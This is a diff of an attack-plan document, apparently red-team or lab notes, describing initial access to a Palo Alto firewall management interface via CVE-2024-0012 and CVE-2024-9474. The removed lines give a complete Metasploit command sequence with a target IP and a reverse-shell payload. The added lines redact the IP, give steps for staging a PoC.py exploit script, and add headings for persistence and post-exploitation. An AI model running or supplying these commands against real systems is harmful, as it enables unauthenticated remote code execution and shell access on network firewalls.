@@ -1,23 +1,19 @@
 # Phase 1: Initial Access via Palo Alto Exploit
 
-Target: Palo Alto firewall management interface at 1.33.170.129
- Exploit Used: Metasploit exploit/linux/http/panos_management_unauth_rce
+Target: Palo Alto firewall management interface at XXX.XXX.XXX.XXX
+ Exploit Used: PoC.py
  CVE: CVE-2024-0012 and CVE-2024-9474
 
-Metasploit Setup:
+Exploit Setup:
 
-```bash
-msfconsole -q 
-use exploit/linux/http/panos_management_unauth_rce
-set RHOSTS 1.33.170.129
-set RPORT 443
-set SSL true
-set TARGETURI /php/login.php
-set PAYLOAD cmd/unix/reverse_perl
-set LHOST eth1
-set LPORT 4444
-exploit
-```
+1. Create a new folder on your attack box as this will be used to stage all of the required files and scripts.
+2. Open a text editor on the attack machine (preferably nano).
+3. Copy and paste the PoC.py script into the text editor (best case of doing this is utilizing ClickPaste and keep the name the same)
+4. If using nano, press ctrl+O and then enter to write out the file, then press ctrl+X to exit the program
+5. chmod +x PoC.py
+   
+
+Persistence Script Setup:
 
 Post-Exploitation:
 ● Upgrade shell if necessary.
